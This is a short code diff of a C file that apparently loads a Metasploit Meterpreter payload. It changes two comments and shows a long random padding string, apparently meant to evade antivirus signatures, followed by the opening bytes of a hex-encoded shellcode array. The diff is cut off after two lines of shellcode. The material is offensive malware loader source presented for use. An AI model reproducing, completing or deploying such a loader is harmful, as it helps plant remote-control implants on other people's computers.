@@ -1,9 +1,9 @@
-// This should be random padding
+// radomiza
 unsigned char padding[]=
 "F9d9CxkqvLlodqpws5x4KoI3KoLdcLTae-0DMrcDZiscZi7Gmzug6g1n8L_W6pzPR-bGsm74TBHy3GDof6o-cMIAaiF5nEvEadpxl9p94w12fiLDreuEjLLhW2QXFbKBAIWOKXvMoiBGZHZY4Lyk24HTPuTonrTbf__hZ0G_q_5DVXfKU0s-muqroz-U6j-wDrX2CzKapy8o1Y5zGo0T3BozAuzwe7Q1A-R4JIWEU8LR-8MJrlF5ZthMo4M661VM8-6CY7duKz29tiPr5IEtpYXBVJyhHYCsPd5iVrNc3wzSVQ6jP9dht-znpNi4-wqWVjKng_3j5WjOlva3_jqLcqkMQ5NfrT7ipYlqxvqgYMUU8rvo9PS_DVkA3tM0W1T6BXLE7nmvZmxojfwfNKQEzzCn1-tYyqcd1z1UTnGEIoZp2sHY-kgofDDnHbNk-4-oMQdwuBt56oCWh7jcNwokcpte26FLJBX4C-yM46CJUlNFrgBg28776xxlTyC02Hs-YdkR-rJNvTt3OWOdCNt-1ocoj20QskIVdv2_XZgrTnxyIEOBBYrrmKHgBq4Qvd816iK1Ua2ZymTVRov1qJeiqvIoCr-hufUkQGjMCCGGSAjPacemgU3ztZZZJIPpB7Dc_zIpkSsaCr0kpDz9lFPn-Fn--cQh2l2gUIA8eiMHFeMLDh40da83tfThQqd_MsGb2OL2LmGCpV_QUdbFecP6-eI80sZG34j9Z3ur_6blZbu1f1qjME-bJKJ2ueT0arvydnnfzHIOt-vt26f0cBeE_11hUiTYmhtH9U4Mppe-eVMUJ5E3XU-Q-20-qCZZBWGV0kK4Lpxu8QGI_NrkRcS3CEantKhUkIaxxXWZRJvk0uEcB_YHerHjZT6Fw8_omY8O2BLT5sAg7f-MQm1P8RfTXYILiTbaqzxvg44y8zdEQpzPY4bgy3svNFVheIseFmOPKs-jL5eJkOlrkvniKFwCKatGKF8Aewli1sYmLP3HKVK8Voy-7b-j377x-SMQKUyByz9F"
 ;
 
-// Our Meterpreter code goes here
+// shallcode aqui
 unsigned char payload[]=
 "\xd9\xc9\xd9\x74\x24\xf4\x5b\x29\xc9\xb8\x90\xcf\xa5\xbe\xb1"
 "\x69\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2\x65\x74\xbd\x7a"
